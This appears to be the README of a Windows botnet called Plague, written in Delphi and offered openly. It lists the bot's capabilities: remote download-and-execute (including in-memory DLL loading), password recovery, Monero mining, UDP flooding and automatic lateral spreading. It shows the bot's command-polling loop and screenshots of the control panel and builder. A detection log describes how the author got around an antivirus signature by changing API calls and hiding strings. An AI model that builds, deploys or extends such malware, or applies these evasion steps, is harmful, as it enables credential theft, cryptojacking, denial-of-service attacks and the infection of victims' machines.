# Plague
Just and older botnet, migrated from a private BitBucket repo.
Written in Delphi, targeting Windows computers. Plague is/was capable of spreading automatically using multiple lateral movement vectors.

## Features
### Basic Client Functions
* Restart
* Update
* Uninstall
### File Functions
* Download File
* Upload File
### Module Execution and Exploitation Functions
* Download and Execute [Drop method]
* Download and Execute [In-memory method]
* Download and Execute [DLL in-memory method]
* Password Recovery
* XMR Mining
* UDP Flood
### Control over the Spreading mechanisms

## Basic execution flow
The basic execution loop is defined in the main unit (Plague.lpr). Once this loop is reached, the execution of the bot instance stays essentially the same.

```delphi
Repeat
  Net.GetCommands; //Download the current command list
  For J:=1 to Net.CommandCount do Begin //Iterate through the available commands
    if Net.Commands[J].Type='Abort' then Begin //If an Abort command is found
      if CommandUnderExecution(Net.Commands[J]) then //and the given command is under execution
        AbortCommand(Net.Commands[J]); //then abort it
    end else Begin //If the command is not an Abort
      if Not(CommandUnderExecution(Net.Commands[J])) then Begin //and it's awaiting execution
        I:=FindAPlace; //then find an empty place in the Worker Array
        NewWorker(I, Net.Commands[J]); //and create a new Worker to execute the command.
      end;
    end;
  End;
  Sleep(Delay); //Wait before contacting the server again
Until False; //Endless loop
```
## Screenshots

<p align="center">
  <img alt="Login interface" src="https://i.imgur.com/M7Ye0M3.png">
  <img alt="Bot list" src="https://i.imgur.com/HFDeFPz.png">
  <img alt="World map" src="https://i.imgur.com/2N95UCw.png">
  <img alt="Builder" src="https://i.imgur.com/GBCDyqo.png">
</p>

## Detection Log
1/29/2019 --> ![Eset](https://i.imgur.com/qM8FDvK.png) Eset NOD32 - a variant of Win32/Agent.TMP trojan

 * **Tools** --> OpenURL --> `ShellExecute` changed to `ShellExecuteW`
 * **CmdWorker** --> Execute --> Mine --> String `config.json` moved to Protected String Storage
 * **CmdWorker** --> Execute --> MemExec --> String `MemExec` added to String Table as `bb32d835`
 * **CmdWorker** --> Execute --> DropExec --> String `DropExec` added to String Table as `896bb1db`
 * **CmdWorker** --> Execute --> Download --> String `Download successful.` moved to Protected String Storage
